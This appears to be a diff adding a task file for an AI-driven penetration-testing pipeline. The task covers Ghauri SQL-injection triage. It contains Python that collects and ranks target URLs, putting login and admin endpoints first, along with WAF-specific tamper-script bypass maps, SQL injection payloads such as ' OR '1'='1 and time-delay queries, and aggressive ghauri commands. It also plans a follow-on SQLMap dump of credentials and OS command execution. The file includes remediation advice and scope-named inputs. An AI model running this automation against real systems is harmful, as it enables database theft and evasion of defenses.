@@ -1,0 +1,704 @@
+# ==============================================================================
+# TASK 43: GHAURI SQL INJECTION TRIAGE
+# ==============================================================================
+# TOOL: Ghauri (fast SQLi scanner)
+# PHASE: 4 - Injection Testing | Step 11 from testing_toolkit.txt
+# MODE: AGGRESSIVE - Fast triage to find easy SQLi wins
+# PURPOSE: Quick scan ALL parameterized URLs, generate prioritized list for SQLMap
+# ==============================================================================
+
+## OBJECTIVE
+
+Ghauri is a FAST SQL injection scanner. Use it to:
+1. Quickly scan ALL parameterized URLs (~5-10 min per batch)
+2. Identify which URLs are vulnerable to SQLi
+3. Generate prioritized list for SQLMap (deep exploitation)
+4. Report immediate findings
+
+## WHY GHAURI BEFORE SQLMAP?
+
+| Tool | Speed | Depth | Use Case |
+|------|-------|-------|----------|
+| **Ghauri** | Fast (~100 URLs/min) | Basic detection | TRIAGE - find what's vulnerable |
+| **SQLMap** | Slow (~5-10 URLs/hr) | Deep exploitation | EXPLOIT - extract data |
+
+**Strategy**: Ghauri finds 20 vulnerable URLs from 500 → SQLMap exploits those 20 deep.
+
+## INPUT SOURCES (FROM PREVIOUS 42 TASKS!)
+
+### 🧠 AI BRAIN: Collect ALL SQLi Targets Dynamically
+
+```
+PRIORITY 1 - ZAP Phase 4 Handoff (Task 41):
+├── outputs/zap/injection_candidates.txt      ← ZAP's parameterized URLs
+├── outputs/zap/injection_candidates.json     ← Categorized by injection type
+├── outputs/zap/sqli_targets.txt              ← SQLi-specific targets
+
+PRIORITY 2 - Parameterized URLs (Tasks 14-16):
+├── outputs/queue_dynamic_endpoints_urls.txt  ← URLs with ?param=value
+├── outputs/arjun_found_params.txt            ← Hidden parameters discovered
+├── outputs/queue_hidden_params_arjun.txt     ← Full URLs with hidden params
+
+PRIORITY 3 - API Endpoints (Tasks 17-18):
+├── outputs/queue_api_endpoints_kiterunner.txt ← API routes (may have params)
+├── outputs/api_endpoints_live.txt             ← Verified live APIs
+├── outputs/api_endpoints_from_openapi.txt     ← OpenAPI extracted endpoints
+
+PRIORITY 4 - HAR Analysis (Task 29):
+├── outputs/har/user1_data.json               ← User1 requests with params
+├── outputs/har/user2_data.json               ← User2 requests with params
+├── outputs/har/common_data.txt               ← All endpoints from HAR
+
+PRIORITY 5 - URL Corpus (Tasks 13-15):
+├── outputs/url_corpus_all_in_scope.txt       ← Full URL corpus
+├── outputs/katana_urls_in_scope.txt          ← Katana discovered URLs
+├── outputs/gau_urls_in_scope.txt             ← GAU historical URLs
+
+PRIORITY 6 - JS Analysis (Tasks 19-22):
+├── outputs/js_endpoints_from_js.txt          ← Endpoints extracted from JS
+├── outputs/js_urls_live.txt                  ← Verified JS endpoints
+
+PRIORITY 7 - Access Control Testing (Tasks 33-34):
+├── outputs/access_control/requests_with_params.json  ← All parsed params
+├── outputs/idor/id_inventory.json                    ← Known ID values
+
+INTELLIGENCE (for decision making):
+├── outputs/nuclei/tech_stack.json            ← Tech stack (MySQL vs Postgres)
+├── outputs/waf/waf_results.json              ← WAF detection (bypass needed?)
+├── temp/task32/waf_findings.json             ← WAF fingerprints per host
+```
+
+## OUTPUT FILES
+
+```
+outputs/sqli/
+├── ghauri_vulnerable.txt           ← CONFIRMED vulnerable URLs
+├── ghauri_possible.txt             ← Needs deeper testing (errors/timeouts)
+├── ghauri_clean.txt                ← No SQLi detected
+├── ghauri_full_results.json        ← All scan results
+├── sqlmap_priority_targets.txt     ← Prioritized list for Task 44
+├── sqli_candidates_all.txt         ← All URLs that were tested
+└── ghauri_scan_stats.json          ← Performance statistics
+
+outputs/vulnerabilities/
+├── SQLI-GHAURI-*.md                ← Individual vulnerability reports
+
+temp/task43/
+├── checkpoint.json                 ← Resume state
+├── targets_queue.txt               ← URLs to scan
+├── scanned_urls.txt                ← Already scanned (dedup)
+└── logs/                           ← Execution logs
+```
+
+## 🧠 DYNAMIC AI BRAIN INSTRUCTIONS
+
+### YOU ARE AN INTELLIGENT AGENT - NOT A SCRIPT RUNNER
+
+The Python script `ghauri_scanner.py` is your BRAIN. It will:
+
+1. **COLLECT all SQLi targets** from previous tasks dynamically
+   - Read ALL input files that exist
+   - Merge and deduplicate
+   - Filter to only URLs with parameters
+
+2. **LEARN from context** to prioritize targets:
+   - WAF detected? → Use --tamper scripts
+   - MySQL detected? → Use MySQL-specific tests
+   - High-value endpoint? → Test more aggressively
+
+3. **ADAPT during scan**:
+   - Found SQLi? → Log immediately, continue
+   - Timeout? → Mark for retry/SQLMap
+   - WAF block? → Try bypass techniques
+
+4. **GENERATE intelligence** for downstream:
+   - Confirmed vulns → Task 44 SQLMap
+   - DB type detected → Include in report
+   - Bypass needed → Document technique
+
+## GHAURI QUICK REFERENCE
+
+### Installation
+```bash
+pip install ghauri
+# or
+git clone https://github.com/r0oth3x49/ghauri
+cd ghauri && python setup.py install
+```
+
+### Basic Usage
+```bash
+# Single URL
+ghauri -u "http://target.com/page?id=1"
+
+# From file
+ghauri -m urls.txt
+
+# With specific technique
+ghauri -u "URL" --technique=BEUST  # Boolean, Error, Union, Stacked, Time
+
+# Aggressive mode
+ghauri -u "URL" --level=3 --risk=3
+
+# WAF bypass
+ghauri -u "URL" --tamper=between,randomcase,space2comment
+
+# Output
+ghauri -u "URL" -o output.txt --batch
+```
+
+### Key Flags
+| Flag | Purpose |
+|------|---------|
+| `-u` | Single target URL |
+| `-m` | Multiple URLs from file |
+| `--technique` | B=Boolean, E=Error, U=Union, S=Stacked, T=Time |
+| `--level` | 1-5 (payload complexity) |
+| `--risk` | 1-3 (risk of damage) |
+| `--tamper` | WAF bypass scripts |
+| `--batch` | Non-interactive mode |
+| `--threads` | Concurrent threads |
+| `--timeout` | Request timeout |
+| `-o` | Output file |
+
+## BRAIN INTELLIGENCE DETAILS
+
+### 1. Target Collector
+
+```python
+class SQLiTargetCollector:
+    """
+    Dynamically collect ALL SQLi targets from previous tasks.
+    NO HARDCODED PATHS - discovers what exists.
+    """
+    
+    # Input file patterns to search for
+    INPUT_PATTERNS = {
+        'zap_candidates': [
+            'outputs/zap/injection_candidates.txt',
+            'outputs/zap/sqli_targets.txt',
+        ],
+        'dynamic_urls': [
+            'outputs/queue_dynamic_endpoints_urls.txt',
+        ],
+        'hidden_params': [
+            'outputs/arjun_found_params.txt',
+            'outputs/queue_hidden_params_arjun.txt',
+        ],
+        'api_endpoints': [
+            'outputs/queue_api_endpoints_kiterunner.txt',
+            'outputs/api_endpoints_live.txt',
+            'outputs/api_endpoints_from_openapi.txt',
+        ],
+        'url_corpus': [
+            'outputs/url_corpus_all_in_scope.txt',
+            'outputs/katana_urls_in_scope.txt',
+            'outputs/gau_urls_in_scope.txt',
+        ],
+        'js_endpoints': [
+            'outputs/js_endpoints_from_js.txt',
+            'outputs/js_urls_live.txt',
+        ],
+        'har_data': [
+            'outputs/har/common_data.txt',
+        ],
+    }
+    
+    def collect_targets(self, workspace_path: str) -> List[str]:
+        """
+        Collect ALL URLs with parameters from all available sources.
+        Returns deduplicated list sorted by priority.
+        """
+        all_urls = []
+        
+        for source_type, paths in self.INPUT_PATTERNS.items():
+            for path in paths:
+                full_path = os.path.join(workspace_path, path)
+                if os.path.exists(full_path):
+                    urls = self._read_urls(full_path, source_type)
+                    all_urls.extend(urls)
+                    logger.info(f"[{source_type}] Loaded {len(urls)} URLs from {path}")
+        
+        # Filter to only URLs with parameters
+        param_urls = [u for u in all_urls if self._has_parameters(u)]
+        
+        # Deduplicate
+        unique_urls = list(set(param_urls))
+        
+        # Prioritize based on patterns
+        return self._prioritize(unique_urls)
+    
+    def _has_parameters(self, url: str) -> bool:
+        """Check if URL has query parameters or obvious injection points."""
+        return any([
+            '?' in url and '=' in url,  # Query params
+            '/api/' in url.lower(),      # API endpoints often have params
+            re.search(r'/\d+/', url),    # Path params like /user/123/
+            re.search(r'/[a-f0-9-]{36}/', url.lower()),  # UUID path params
+        ])
+    
+    def _prioritize(self, urls: List[str]) -> List[str]:
+        """
+        Prioritize URLs for SQLi testing.
+        Higher value targets first.
+        """
+        def priority_score(url: str) -> int:
+            score = 0
+            url_lower = url.lower()
+            
+            # High-value params (likely database interaction)
+            high_value = ['id=', 'user', 'account', 'order', 'product', 
+                         'item', 'category', 'search', 'query', 'filter',
+                         'sort', 'page', 'limit', 'offset']
+            for hv in high_value:
+                if hv in url_lower:
+                    score += 10
+            
+            # State-changing endpoints
+            if any(x in url_lower for x in ['/api/', '/v1/', '/v2/', '/graphql']):
+                score += 5
+            
+            # Auth endpoints (high impact)
+            if any(x in url_lower for x in ['login', 'auth', 'session', 'token']):
+                score += 15
+            
+            # Admin/internal
+            if any(x in url_lower for x in ['admin', 'internal', 'manage', 'dashboard']):
+                score += 20
+            
+            return score
+        
+        return sorted(urls, key=priority_score, reverse=True)
+```
+
+### 2. WAF-Aware Scanner
+
+```python
+class WAFAwareScanner:
+    """
+    Adapts Ghauri commands based on WAF detection from Task 32.
+    """
+    
+    TAMPER_BY_WAF = {
+        'cloudflare': ['between', 'randomcase', 'space2comment'],
+        'akamai': ['charencode', 'chardoubleencode', 'space2plus'],
+        'aws_waf': ['apostrophemask', 'base64encode', 'between'],
+        'imperva': ['modsecurityversioned', 'space2morehash'],
+        'f5_bigip': ['percentage', 'charencode', 'randomcomments'],
+        'mod_security': ['modsecurityzeroversioned', 'space2mysqldash'],
+        'default': ['between', 'randomcase'],  # Generic bypass
+    }
+    
+    def __init__(self, waf_results_path: str):
+        self.waf_map = self._load_waf_results(waf_results_path)
+    
+    def _load_waf_results(self, path: str) -> Dict[str, str]:
+        """Load WAF detection results from Task 32."""
+        waf_map = {}
+        if os.path.exists(path):
+            try:
+                with open(path, 'r') as f:
+                    data = json.load(f)
+                    for entry in data:
+                        host = urlparse(entry.get('url', '')).netloc
+                        waf = entry.get('waf', 'none').lower()
+                        if waf != 'none':
+                            waf_map[host] = waf
+            except:
+                pass
+        return waf_map
+    
+    def get_ghauri_command(self, url: str, base_args: List[str]) -> List[str]:
+        """Build Ghauri command with WAF-specific bypass."""
+        host = urlparse(url).netloc
+        waf = self.waf_map.get(host)
+        
+        cmd = ['ghauri', '-u', url] + base_args
+        
+        if waf:
+            # Add WAF-specific tamper scripts
+            tampers = self.TAMPER_BY_WAF.get(waf, self.TAMPER_BY_WAF['default'])
+            cmd.extend(['--tamper', ','.join(tampers)])
+            logger.info(f"[WAF] {host} has {waf}, using tampers: {tampers}")
+        
+        return cmd
+```
+
+### 3. Database-Aware Testing
+
+```python
+class DatabaseAwareScanner:
+    """
+    Adapts testing based on detected database from Nuclei (Task 35-36).
+    """
+    
+    DB_SPECIFIC_TECHNIQUES = {
+        'mysql': {
+            'techniques': 'BEUST',  # All techniques work well
+            'payloads': ['sleep(5)', "' OR '1'='1", "1' AND '1'='1"],
+        },
+        'postgresql': {
+            'techniques': 'BEUT',   # No stacked by default
+            'payloads': ['pg_sleep(5)', "' OR '1'='1"],
+        },
+        'mssql': {
+            'techniques': 'BEUST',  # Stacked queries common
+            'payloads': ['WAITFOR DELAY \'0:0:5\'', "' OR '1'='1"],
+        },
+        'oracle': {
+            'techniques': 'BET',    # Union tricky
+            'payloads': ['dbms_pipe.receive_message(\'a\',5)'],
+        },
+        'sqlite': {
+            'techniques': 'BEUT',
+            'payloads': ['randomblob(500000000/2)'],
+        },
+    }
+    
+    def __init__(self, nuclei_brain_path: str):
+        self.host_db = self._detect_databases(nuclei_brain_path)
+    
+    def _detect_databases(self, path: str) -> Dict[str, str]:
+        """Detect database type per host from Nuclei findings."""
+        host_db = {}
+        if os.path.exists(path):
+            try:
+                with open(path, 'r') as f:
+                    data = json.load(f)
+                    tech_to_hosts = data.get('tech_to_hosts', {})
+                    
+                    for tech, hosts in tech_to_hosts.items():
+                        tech_lower = tech.lower()
+                        db_type = None
+                        
+                        if 'mysql' in tech_lower or 'mariadb' in tech_lower:
+                            db_type = 'mysql'
+                        elif 'postgres' in tech_lower:
+                            db_type = 'postgresql'
+                        elif 'mssql' in tech_lower or 'sql server' in tech_lower:
+                            db_type = 'mssql'
+                        elif 'oracle' in tech_lower:
+                            db_type = 'oracle'
+                        elif 'sqlite' in tech_lower:
+                            db_type = 'sqlite'
+                        
+                        if db_type:
+                            for host in hosts:
+                                host_db[host] = db_type
+            except:
+                pass
+        return host_db
+    
+    def get_technique_for_url(self, url: str) -> str:
+        """Get optimal SQLi technique based on detected database."""
+        host = urlparse(url).netloc
+        db_type = self.host_db.get(host, 'mysql')  # Default to MySQL
+        return self.DB_SPECIFIC_TECHNIQUES.get(db_type, {}).get('techniques', 'BEUST')
+```
+
+### 4. Batch Scanner with Resume
+
+```python
+class GhauriBatchScanner:
+    """
+    Scan URLs in batches with checkpoint/resume capability.
+    """
+    
+    BATCH_SIZE = 50  # URLs per batch
+    BATCH_TIME_LIMIT = 540  # 9 minutes
+    TIMEOUT_PER_URL = 60  # 1 minute max per URL
+    
+    def __init__(self, output_dir: str, temp_dir: str):
+        self.output_dir = Path(output_dir)
+        self.temp_dir = Path(temp_dir)
+        self.checkpoint_file = self.temp_dir / 'checkpoint.json'
+        self.results = {
+            'vulnerable': [],
+            'possible': [],
+            'clean': [],
+            'errors': [],
+        }
+        
+    def scan_all(self, targets: List[str]):
+        """Scan all targets with batching and resume."""
+        # Load checkpoint
+        checkpoint = self._load_checkpoint()
+        start_idx = checkpoint.get('last_completed', 0)
+        
+        total = len(targets)
+        logger.info(f"[SCAN] Starting from {start_idx}/{total}")
+        
+        batch_start = time.time()
+        
+        for i, url in enumerate(targets[start_idx:], start=start_idx):
+            # Check batch time limit
+            if time.time() - batch_start > self.BATCH_TIME_LIMIT:
+                logger.info(f"[BATCH] Time limit reached at {i}/{total}")
+                self._save_checkpoint(i)
+                self._save_results()
+                return  # Will resume later
+            
+            # Scan single URL
+            result = self._scan_url(url)
+            
+            # Categorize result
+            if result['status'] == 'vulnerable':
+                self.results['vulnerable'].append(result)
+                self._write_vuln_report(result)
+                logger.info(f"[VULN] SQLi found: {url}")
+            elif result['status'] == 'possible':
+                self.results['possible'].append(result)
+            elif result['status'] == 'error':
+                self.results['errors'].append(result)
+            else:
+                self.results['clean'].append(url)
+            
+            # Progress checkpoint every 10 URLs
+            if i % 10 == 0:
+                self._save_checkpoint(i)
+                logger.info(f"[PROGRESS] {i}/{total} scanned")
+        
+        # Final save
+        self._save_checkpoint(total)
+        self._save_results()
+        self._generate_sqlmap_targets()
+        logger.info(f"[COMPLETE] {total} URLs scanned")
+    
+    def _scan_url(self, url: str) -> Dict:
+        """Scan single URL with Ghauri."""
+        result = {
+            'url': url,
+            'status': 'clean',
+            'technique': None,
+            'db_type': None,
+            'payload': None,
+            'error': None,
+        }
+        
+        try:
+            # Build command
+            cmd = [
+                'ghauri', '-u', url,
+                '--batch',
+                '--level', '2',
+                '--risk', '2',
+                '--timeout', str(self.TIMEOUT_PER_URL),
+                '--threads', '5',
+            ]
+            
+            # Run ghauri
+            proc = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=self.TIMEOUT_PER_URL + 30
+            )
+            
+            output = proc.stdout + proc.stderr
+            
+            # Parse output for SQLi detection
+            if 'is vulnerable' in output.lower() or 'sqlmap identified' in output.lower():
+                result['status'] = 'vulnerable'
+                result['technique'] = self._extract_technique(output)
+                result['db_type'] = self._extract_db_type(output)
+                result['payload'] = self._extract_payload(output)
+            elif 'heuristic' in output.lower() or 'might be' in output.lower():
+                result['status'] = 'possible'
+            
+        except subprocess.TimeoutExpired:
+            result['status'] = 'possible'  # Timeout might indicate SQLi
+            result['error'] = 'timeout'
+        except Exception as e:
+            result['status'] = 'error'
+            result['error'] = str(e)
+        
+        return result
+    
+    def _generate_sqlmap_targets(self):
+        """Generate prioritized list for SQLMap (Task 44)."""
+        # Priority order: vulnerable > possible > high-value clean
+        priority_targets = []
+        
+        # Confirmed vulnerable - highest priority
+        for r in self.results['vulnerable']:
+            priority_targets.append({
+                'url': r['url'],
+                'priority': 1,
+                'reason': f"Confirmed SQLi via {r['technique']}",
+                'db_type': r.get('db_type'),
+            })
+        
+        # Possible - medium priority
+        for r in self.results['possible']:
+            priority_targets.append({
+                'url': r['url'],
+                'priority': 2,
+                'reason': 'Heuristic detection / timeout',
+            })
+        
+        # Save for SQLMap
+        sqlmap_file = self.output_dir / 'sqlmap_priority_targets.txt'
+        with open(sqlmap_file, 'w') as f:
+            for t in priority_targets:
+                f.write(f"{t['url']}\n")
+        
+        sqlmap_json = self.output_dir / 'sqlmap_priority_targets.json'
+        with open(sqlmap_json, 'w') as f:
+            json.dump(priority_targets, f, indent=2)
+        
+        logger.info(f"[SQLMAP] Generated {len(priority_targets)} targets for Task 44")
+```
+
+## EXECUTION FLOW
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│  PREVIOUS TASKS (42 tasks worth of data!)                       │
+│                                                                 │
+│  Task 41 ZAP → injection_candidates.txt                         │
+│  Task 16 Arjun → hidden params                                  │
+│  Task 17 Kiterunner → API endpoints                             │
+│  Task 29 HAR → request params                                   │
+│  Task 32 WAF → bypass techniques needed                         │
+│  Task 35 Nuclei → database types                                │
+└─────────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────────┐
+│  Task 43: GHAURI FAST TRIAGE (THIS TASK)                        │
+│                                                                 │
+│  1. Collect ALL parameterized URLs                              │
+│  2. Deduplicate and prioritize                                  │
+│  3. Check WAF status per host                                   │
+│  4. Check DB type per host                                      │
+│  5. Scan with Ghauri (fast)                                     │
+│  6. Categorize: vulnerable / possible / clean                   │
+│  7. Generate reports for vulnerables                            │
+│  8. Generate sqlmap_priority_targets.txt                        │
+└─────────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────────┐
+│  Task 44: SQLMap Deep Exploitation                              │
+│  - Takes Ghauri's prioritized targets                           │
+│  - Full exploitation: --dbs, --tables, --dump                   │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+## RUN COMMANDS
+
+```bash
+# Full automated scan using AI brain
+python task/task43/ghauri_scanner.py \
+    --workspace d:\wallet\Mylab \
+    --output outputs/sqli \
+    --temp temp/task43
+
+# Resume from checkpoint
+python task/task43/ghauri_scanner.py \
+    --workspace d:\wallet\Mylab \
+    --output outputs/sqli \
+    --temp temp/task43 \
+    --resume
+
+# Manual single URL test
+ghauri -u "http://target.com/page?id=1" --batch --level=3 --risk=3
+
+# Manual with WAF bypass
+ghauri -u "http://target.com/page?id=1" --tamper=between,randomcase
+```
+
+## VULNERABILITY REPORT TEMPLATE
+
+```markdown
+# SQL Injection Vulnerability: SQLI-GHAURI-{ID}
+
+## Summary
+| Field | Value |
+|-------|-------|
+| **ID** | SQLI-GHAURI-{sequential_id} |
+| **URL** | {url} |
+| **Parameter** | {param} |
+| **Technique** | {technique} |
+| **Database** | {db_type} |
+| **Severity** | CRITICAL |
+| **Confidence** | {HIGH/MEDIUM} |
+| **Discovered** | {timestamp} |
+
+## Technical Details
+
+### Vulnerable Parameter
+- **Parameter Name**: `{param}`
+- **Injection Point**: {GET/POST/Cookie/Header}
+- **Technique**: {Boolean/Error/Union/Time/Stacked}
+
+### Payload Used
+```
+{payload}
+```
+
+### Evidence
+```
+{ghauri_output_snippet}
+```
+
+## Impact
+
+SQL Injection allows attacker to:
+- Extract sensitive data from database
+- Bypass authentication
+- Modify/delete data
+- Potentially execute OS commands (if stacked queries work)
+- Full database compromise
+
+## 🧠 AI Intelligence
+
+### Why This URL Was Prioritized
+{brain reasoning - high-value param name, API endpoint, etc.}
+
+### Database Context
+- Detected DB: {db_type from Nuclei}
+- WAF Status: {waf_type or none}
+- Bypass Technique: {tamper scripts used}
+
+### Recommended Next Steps
+1. Run SQLMap for deep exploitation (Task 44)
+2. Attempt to extract: users table, credentials
+3. Check for stacked queries → OS command execution
+4. Document data exposure scope
+
+## Proof of Concept
+```bash
+# Reproduce with:
+ghauri -u "{url}" --technique={technique} --batch
+```
+
+## Recommendations
+1. Use parameterized queries / prepared statements
+2. Implement input validation
+3. Apply least-privilege database permissions
+4. Enable WAF with SQLi rules (if not already)
+```
+
+## SUCCESS CRITERIA
+
+- [ ] Collected targets from ALL available input sources
+- [ ] Loaded WAF intel from Task 32
+- [ ] Loaded DB type intel from Task 35
+- [ ] Scanned all parameterized URLs with Ghauri
+- [ ] Categorized results: vulnerable / possible / clean
+- [ ] Generated vulnerability reports for confirmed SQLi
+- [ ] Created sqlmap_priority_targets.txt for Task 44
+- [ ] Saved checkpoint for resume capability
+
+## CHAIN TO NEXT TASKS
+
+```
+Task 43 (This - Ghauri Triage) → Task 44 (SQLMap Deep)
+
+OUTPUT FILES FOR TASK 44:
+├── outputs/sqli/sqlmap_priority_targets.txt   ← URLs to exploit
+├── outputs/sqli/sqlmap_priority_targets.json  ← With metadata
+├── outputs/sqli/ghauri_vulnerable.txt         ← Confirmed vulns
+└── outputs/sqli/ghauri_possible.txt           ← Needs deeper test
+```
